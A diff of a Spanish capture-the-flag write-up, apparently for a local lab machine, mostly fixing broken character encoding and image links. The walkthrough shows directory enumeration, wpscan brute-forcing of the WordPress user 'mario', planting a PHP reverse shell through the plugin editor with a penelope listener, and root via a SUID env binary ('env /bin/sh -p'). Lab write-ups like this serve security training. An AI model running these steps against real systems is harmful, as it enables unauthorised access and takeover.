@@ -7,25 +7,25 @@ VectorInicial: WordPress login + plugin edit RCE
 Privesc: SUID env
 Fecha: 2026-02-16
 ---
-<img width="911" height="510" alt="Pasted image 20260216150558" src="https://github.com/user-attachments/assets/7a2d1195-dd1e-40d0-aa99-65f15b273945" />
+![[../../attachments/Pasted image 20260216150558.png]]
 
 Para empezar realizaremos un reconocimiento para ver que podemos encontrar.
 
 ```bash
-settarget 172.17.0.2                                              
+ settarget 172.17.0.2                                              
 TARGET establecido: 172.17.0.2
 
-gomap -s $TARGET                                                                                                         
-­ Scanning 172.17.0.2 (997 ports)
+ gomap -s $TARGET                                                                                                         
+🎯 Scanning 172.17.0.2 (997 ports)
 
  PORT    STATE  SERVICE      VERSION
 80 open http Apache 2.4.57 (Debian)
 ```
 
-Tenemos un servicio corriendo en el puerto 80 bajo un apache, pero en la ra├¡z ├║nicamente encontramos la p├ígina por defecto de Apache, por lo que procederemos a realizar enumeraci├│n de directorios.
+Tenemos un servicio corriendo en el puerto 80 bajo un apache, pero en la raíz únicamente encontramos la página por defecto de Apache, por lo que procederemos a realizar enumeración de directorios.
 
 ```bash
-é dirb http://$TARGET                                                                                          
+ dirb http://$TARGET                                                                                          
 
 -----------------
 DIRB v2.22    
@@ -55,16 +55,16 @@ GENERATED WORDS: 4612
 <snip>
 ```
 
-Estamos frente a un Wordpress en una carpeta distinta al ra├¡z, as├¡ que vamos a explorar la web a ver si encontramos algo interesante.
+Estamos frente a un Wordpress en una carpeta distinta al raíz, así que vamos a explorar la web a ver si encontramos algo interesante.
 
-Solo encontramos en una publicaci├│n el usuario **mario** as├¡ que usaremos una herramienta para ver si encontramos mas informaci├│n.
+Solo encontramos en una publicación el usuario **mario** así que usaremos una herramienta para ver si encontramos mas información.
 
 ```bash
-é wpscan --url http://$TARGET/wordpress/ -e u,p --plugins-detection aggressive
+ wpscan --url http://$TARGET/wordpress/ -e u,p --plugins-detection aggressive
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
-          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ┬«
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
            \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
             \  /\  /  | |     ____) | (__| (_| | | | |
              \/  \/   |_|    |_____/ \___|\__,_|_| |_|
@@ -154,11 +154,11 @@ En tema de usuarios vemos que solo existe el mismo que encontramos antes, **mari
 Pero intentaremos encontrar primero el acceso del usuario *mario*.
 
 ```bash
-é wpscan --url http://$TARGET/wordpress/ -U mario --passwords /usr/share/wordlists/rockyou.txt
+ wpscan --url http://$TARGET/wordpress/ -U mario --passwords /usr/share/wordlists/rockyou.txt
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
-          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ┬«
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
            \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
             \  /\  /  | |     ____) | (__| (_| | | | |
              \/  \/   |_|    |_____/ \___|\__,_|_| |_|
@@ -182,27 +182,27 @@ Trying mario / love Time: 00:00:03 <
 
 Con estos datos entraremos al panel de control de Wordpress.
 
-Una vez dentro nos dirigiremos al plugin vulnerable que encontramos antes para inyectar c├│digo y conseguir una revershell.
+Una vez dentro nos dirigiremos al plugin vulnerable que encontramos antes para inyectar código y conseguir una revershell.
 
-<img width="1899" height="857" alt="Pasted image 20260216160309" src="https://github.com/user-attachments/assets/fed97b08-559b-45aa-bda4-d053a5057e63" />
+![[../../attachments/Pasted image 20260216160309.png]]
 
-Usaremos el c├│digo PHP de Pentestmonkey's reverse shell y nos pondremos a la escucha.
+Usaremos el código PHP de Pentestmonkey's reverse shell y nos pondremos a la escucha.
 
 ```bash
-é penelope -p 443    
-[+] Listening for reverse shells on 0.0.0.0:443 ÔåÆ  127.0.0.1 ÔÇó 10.0.11.3 ÔÇó 172.17.0.1
-Ô×ñ  ­Åá Main Menu (m) ­ÆÇ Payloads (p) ­ö Clear (Ctrl-L) ­Ü½ Quit (q/Ctrl-C)
-[+] Got reverse shell from cf97ec34ece9~172.17.0.2-Linux-x86_64 ­ÿì´©Å Assigned SessionID <1>
+ penelope -p 443    
+[+] Listening for reverse shells on 0.0.0.0:443 →  127.0.0.1 • 10.0.11.3 • 172.17.0.1
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] Got reverse shell from cf97ec34ece9~172.17.0.2-Linux-x86_64 😍️ Assigned SessionID <1>
 [+] Attempting to upgrade shell to PTY...
 [!] Python agent cannot be deployed. I need to maintain at least one Raw session to handle the PTY
 [+] Attempting to spawn a reverse shell on 172.17.0.1:443
-[+] Got reverse shell from cf97ec34ece9~172.17.0.2-Linux-x86_64 ­ÿì´©Å Assigned SessionID <2>
+[+] Got reverse shell from cf97ec34ece9~172.17.0.2-Linux-x86_64 😍️ Assigned SessionID <2>
 [+] Attempting to upgrade shell to PTY...
-[+] Shell upgraded successfully using /usr/bin/script! ­Æ¬
+[+] Shell upgraded successfully using /usr/bin/script! 💪
 [+] Interacting with session [2], Shell Type: PTY, Menu key: F12 
-[+] Logging to /home/jduran/.penelope/sessions/cf97ec34ece9~172.17.0.2-Linux-x86_64/2026_02_16-16_05_00-759.log ­ô£
-ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
-[+] Shell upgraded successfully using /usr/bin/script! ­Æ¬
+[+] Logging to /home/jduran/.penelope/sessions/cf97ec34ece9~172.17.0.2-Linux-x86_64/2026_02_16-16_05_00-759.log 📜
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+[+] Shell upgraded successfully using /usr/bin/script! 💪
 www-data@cf97ec34ece9:/$ 
 ```
 
@@ -221,7 +221,7 @@ www-data@cf97ec34ece9:/$ find / -perm -4000 2>/dev/null
 /usr/bin/chfn
 ```
 
-En este caso encontramos un **SUID** para **env**, as├¡ que buscaremos en la web de GTFOBINS la forma de usarlo para convertirnos en *root*
+En este caso encontramos un **SUID** para **env**, así que buscaremos en la web de GTFOBINS la forma de usarlo para convertirnos en *root*
 
 ```bash
 www-data@cf97ec34ece9:/$ env /bin/sh -p
@@ -231,10 +231,4 @@ root
 
 Y con este ultimo paso ya somos administradores del sistema.
 
-Aunque el plugin theme-editor presenta vulnerabilidades conocidas, en este caso no fue necesario explotarlas directamente, ya que conseguimos acceso como administrador mediante credenciales d├®biles y pudimos modificar el c├│digo del plugin para obtener ejecuci├│n remota de comandos.
-
----
-Si te gusto puedes invitarme a un cafe.
-[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/C0C61UHTB1)
-
-
+Aunque el plugin theme-editor presenta vulnerabilidades conocidas, en este caso no fue necesario explotarlas directamente, ya que conseguimos acceso como administrador mediante credenciales débiles y pudimos modificar el código del plugin para obtener ejecución remota de comandos.
